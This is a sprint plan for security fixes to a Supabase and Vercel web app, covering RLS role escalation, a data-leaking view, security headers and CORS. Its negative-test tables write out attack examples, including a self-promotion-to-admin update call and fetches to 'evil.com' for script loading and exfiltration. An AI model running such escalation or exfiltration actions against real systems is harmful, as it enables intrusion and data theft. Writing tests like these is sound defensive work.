# Sprint 1 -- Critical Fixes & Infrastructure

**Duration:** 1 week
**Focus:** Eliminate the critical privilege escalation vulnerability, close data leak in the view layer, and establish baseline HTTP security headers and CORS restrictions.
**Priority:** All items are Critical or High severity. No item in this sprint is deferrable.

---

## Sprint Goal

After this sprint, the three most exploitable attack vectors are closed: a user can no longer self-escalate roles, cross-user food data is no longer leaked through the view, the app serves proper security headers, and the Edge Function stops accepting requests from arbitrary origins.

---

## Checklist

- [ ] **Task 1** -- Fix `profiles_self_update` RLS policy
- [ ] **Task 2** -- Fix `food_name_suggestions` view
- [ ] **Task 3** -- Add security headers to `vercel.json`
- [ ] **Task 4** -- Restrict Edge Function CORS

---

## Task 1 -- Fix `profiles_self_update` RLS (Critical)

**Severity:** Critical
**Layer:** Database
**File:** `supabase/schema.sql` line 198-199
**Estimated effort:** 1-2 hours

### Problem

The `profiles_self_update` policy has no column restriction. Any authenticated user can escalate their role to `admin` via a direct Supabase client call from browser DevTools:

```js
supabase.from('profiles').update({ role: 'admin' }).eq('id', myUserId)
```

### Implementation

1. Create `supabase/migration_harden_self_update.sql`:

```sql
-- Hardening: prevent users from changing their own role or is_active flag
drop policy if exists "profiles_self_update" on public.profiles;

create policy "profiles_self_update" on public.profiles
  for update
  using (auth.uid() = id)
  with check (
    auth.uid() = id
    AND role = (select p.role from public.profiles p where p.id = auth.uid())
    AND is_active = (select p.is_active from public.profiles p where p.id = auth.uid())
  );
```

2. Update `supabase/schema.sql` with the same policy definition
3. Run the migration in Supabase SQL Editor

### Acceptance Criteria

- [ ] `klien` calling `.update({ role: 'admin' })` gets a policy violation
- [ ] `klien` calling `.update({ is_active: true })` after deactivation is blocked
- [ ] `klien` can still update `nomor_wa`, `phone_whatsapp`, and other profile fields
- [ ] Staff `for all` policy on `profiles` remains unaffected

### Negative Scenarios

| # | Scenario | Action | Expected Result |
|---|----------|--------|-----------------|
| N1 | Role escalation via DevTools | `klien` runs `supabase.from('profiles').update({ role: 'admin' }).eq('id', uid)` | RLS policy violation error; role stays `klien` |
| N2 | Role escalation to `ahli_gizi` | `klien` runs `.update({ role: 'ahli_gizi' })` | Same RLS violation; not just `admin` is blocked |
| N3 | Reactivation after deactivation | Deactivated user runs `.update({ is_active: true })` | Blocked; `is_active` stays `false` |
| N4 | Combined field update with hidden role change | `klien` runs `.update({ nomor_wa: '08123', role: 'admin' })` | Entire update rejected (not partial); `nomor_wa` unchanged |
| N5 | Null role injection | `klien` runs `.update({ role: null })` | Blocked by `WITH CHECK` (null != current role) |
| N6 | Empty string role | `klien` runs `.update({ role: '' })` | Blocked by CHECK constraint on `role` column |
| N7 | Update another user's profile | `klien` runs `.update({ nama: 'Hacked' }).eq('id', otherUserId)` | Blocked by `USING (auth.uid() = id)` |
| N8 | Staff updating a user's role | `admin` runs `.update({ role: 'ahli_gizi' }).eq('id', klienId)` | Succeeds (staff `for all` policy) |

### Verification

```sql
-- As a klien user, this should fail:
update profiles set role = 'admin' where id = auth.uid();
-- Expected: ERROR: new row violates row-level security policy

-- This should also fail (any role change):
update profiles set role = 'ahli_gizi' where id = auth.uid();
-- Expected: ERROR: new row violates row-level security policy

-- This should succeed (allowed field):
update profiles set nomor_wa = '08123456789' where id = auth.uid();
-- Expected: UPDATE 1
```

---

## Task 2 -- Fix `food_name_suggestions` View (High)

**Severity:** High
**Layer:** Database
**File:** `supabase/schema.sql` line 102-106
**Estimated effort:** 1 hour

### Problem

The `food_name_suggestions` view aggregates ALL `food_log_items` without filtering by user. Views bypass RLS by default. Any authenticated user can read every food name logged by every other user.

### Implementation

**Option A -- Make the view respect RLS (recommended if per-user autocomplete is acceptable):**

```sql
drop view if exists public.food_name_suggestions;

create view public.food_name_suggestions
  with (security_invoker = true)
as
  select nama_makanan, count(*)::bigint as frekuensi
  from public.food_log_items
  group by nama_makanan
  order by frekuensi desc;
```

**Option B -- Keep global corpus but document the decision:**

If the autocomplete intentionally draws from all users' food names to improve suggestion quality, add a prominent comment:

```sql
-- SECURITY NOTE: This view intentionally aggregates food names across all users
-- to provide a shared autocomplete corpus. Only food names and frequency are exposed,
-- not user identity, quantities, or calorie data. This is an accepted privacy trade-off
-- for improved UX. Reviewed: <date>.
```

### Acceptance Criteria

- [ ] Option A or B is chosen and applied
- [ ] Food entry autocomplete still works correctly
- [ ] Migration file `supabase/migration_food_suggestions_view.sql` is created

### Negative Scenarios

| # | Scenario | Action | Expected Result |
|---|----------|--------|-----------------|
| N1 | Cross-user food name leak (Option A) | `klien_A` logs "Nasi Goreng"; `klien_B` queries `food_name_suggestions` | `klien_B` does NOT see `klien_A`'s "Nasi Goreng" |
| N2 | Unauthenticated view access | Query `food_name_suggestions` without JWT | Empty result or 401; no data exposed |
| N3 | Staff accessing suggestions | `ahli_gizi` queries `food_name_suggestions` | Returns food names from their accessible scope (via `food_log_items` RLS) |
| N4 | Empty result for new user | New `klien` with no food logs queries the view | Returns empty result, no error |

---

## Task 3 -- Add Security Headers (High)

**Severity:** High
**Layer:** Deployment
**File:** `vercel.json`
**Estimated effort:** 1-2 hours (including testing)

### Problem

No CSP, HSTS, X-Frame-Options, or other security headers. The app is vulnerable to clickjacking, MIME sniffing attacks, and unrestricted script execution.

### Implementation

Update `vercel.json`:

```json
{
  "rewrites": [{ "source": "/(.*)", "destination": "/index.html" }],
  "headers": [
    {
      "source": "/(.*)",
      "headers": [
        {
          "key": "Content-Security-Policy",
          "value": "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com; img-src 'self' data: https:; connect-src 'self' https://*.supabase.co; frame-ancestors 'none';"
        },
        {
          "key": "Strict-Transport-Security",
          "value": "max-age=63072000; includeSubDomains; preload"
        },
        { "key": "X-Content-Type-Options", "value": "nosniff" },
        { "key": "X-Frame-Options", "value": "DENY" },
        {
          "key": "Referrer-Policy",
          "value": "strict-origin-when-cross-origin"
        },
        {
          "key": "Permissions-Policy",
          "value": "camera=(), microphone=(), geolocation=()"
        }
      ]
    }
  ]
}
```

### Acceptance Criteria

- [ ] All six headers present in Vercel preview deployment response
- [ ] No console errors from CSP blocking fonts, styles, images, or API calls
- [ ] Google Fonts load correctly (`style-src` + `font-src` allowlisted)
- [ ] Supabase API calls work (`connect-src` allowlisted)
- [ ] Lighthouse "Best Practices" score does not regress

### Negative Scenarios

| # | Scenario | Action | Expected Result |
|---|----------|--------|-----------------|
| N1 | Inline script injection | Inject `<script>alert(1)</script>` via DOM manipulation | Blocked by CSP `script-src 'self'`; console shows CSP violation |
| N2 | Clickjacking attempt | Embed the app in an `<iframe>` on another domain | Blocked by `X-Frame-Options: DENY` and `frame-ancestors 'none'` |
| N3 | External script loading | Try to load a script from `https://evil.com/xss.js` | Blocked by CSP; script does not execute |
| N4 | MIME sniffing | Serve a file with mismatched Content-Type | Browser respects `X-Content-Type-Options: nosniff`; no MIME sniffing |
| N5 | Third-party connect attempt | JS tries to `fetch('https://evil.com/exfil')` | Blocked by CSP `connect-src` restriction |

### Testing

```bash
curl -I https://<preview-url>
# Verify headers in response

# Test iframe blocking:
# Create a test HTML: <iframe src="https://<preview-url>"></iframe>
# Open in browser -- iframe should refuse to load
```

---

## Task 4 -- Restrict Edge Function CORS (High)

**Severity:** High
**Layer:** Edge Function
**File:** `supabase/functions/estimate-calories/index.ts` line 3-8
**Estimated effort:** 30 minutes

### Problem

`Access-Control-Allow-Origin: *` allows any website to call the Edge Function with a stolen JWT.

### Implementation

```typescript
const ALLOWED_ORIGIN = Deno.env.get('ALLOWED_ORIGIN') || '*'

const corsHeaders: Record<string, string> = {
  'Access-Control-Allow-Origin': ALLOWED_ORIGIN,
  'Access-Control-Allow-Methods': 'POST, OPTIONS',
  'Access-Control-Allow-Headers':
    'authorization, x-client-info, apikey, content-type',
}
```

Then set the production secret:

```bash
supabase secrets set ALLOWED_ORIGIN=https://<production-domain>.vercel.app
```

Update `.env.example` and `README.md` to document `ALLOWED_ORIGIN`.

### Acceptance Criteria

- [ ] Production responses have exact origin, not `*`
- [ ] `supabase functions serve` (local dev) still works without setting the secret
- [ ] `.env.example` documents `ALLOWED_ORIGIN`
- [ ] `README.md` Supabase setup section mentions the new secret

### Negative Scenarios

| # | Scenario | Action | Expected Result |
|---|----------|--------|-----------------|
| N1 | Cross-origin request from malicious site | `fetch` from `https://evil.com` to the Edge Function with a valid JWT | Browser blocks the response (CORS preflight fails; `Access-Control-Allow-Origin` does not match) |
| N2 | Missing Origin header (curl) | `curl -X POST` directly to the function URL | Request succeeds (CORS is browser-enforced; server still processes the request, but browsers are protected) |
| N3 | Origin spoofing via header | Attacker sets `Origin: https://legit-domain.vercel.app` in a non-browser client | Request succeeds (CORS is not a server-side auth mechanism; the JWT check is the actual security boundary) |
| N4 | OPTIONS preflight from wrong origin | Browser sends `OPTIONS` from `https://evil.com` | Response has `Access-Control-Allow-Origin` set to production domain, not `*`; browser blocks subsequent POST |

---

## Definition of Done (Sprint 1)

- All four tasks have passing acceptance criteria
- Migration SQL files are committed alongside `schema.sql` updates
- `vercel.json` changes are deployed to a preview environment and verified
- Edge Function is redeployed with the new CORS logic
